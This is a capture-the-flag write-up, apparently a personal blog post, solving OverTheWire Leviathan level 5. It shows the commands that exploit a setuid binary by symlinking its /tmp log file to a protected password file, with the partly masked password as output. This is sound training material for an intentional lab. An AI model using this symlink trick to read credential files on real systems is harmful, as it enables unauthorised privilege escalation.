---
title: OverTheWire Leviathan Level 4 -> 5
author: Michael McDonagh
pubDatetime: 2025-03-02T12:45:00Z
slug: overthewire-leviathan-5
featured: false
draft: false
tags:
  - overthewire
  - leviathan
  - linux
ogImage: ""
description: Solution for OverTheWire Leviathan level 5 challenge.
---

## Level Goal  

There is no information for this level, intentionally.

---

## Walkthrough  

Solution for the Overthewire.org [Leviathan level 5](https://overthewire.org/wargames/leviathan/leviathan5.html)

Login to the server using the password obtained from the previous level [Leviathan level 4](/posts/overthewire-leviathan-4).  

username: `leviathan5`  

```bash
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

With no description given first thing we do is check what is in the home directory.

```bash
leviathan5@leviathan:~$ ls -al
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

There is an executable file `leviathan5` with the suid bit set.
When we run `leviathan5` we get an error stating it cannot find `file.log`.

```bash
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
```

What happens if the file exists ? Let's create the file.

```bash
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5

```

Nothing seems to have happened and the file is now deleted.

Let's try again but this time put some text in the file.

```bash
leviathan5@leviathan:~$ echo "Hello" >  /tmp/file.log

leviathan5@leviathan:~$ ./leviathan5
Hello
```

The contents of the file was printed to screen and the file then deleted.

Since `leviathan5` file runs with leviathan6 permissions we can create a symbolic link between the password file and file.log and print the password.

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

leviathan5@leviathan:~$ ./leviathan5 
Uga*******
```
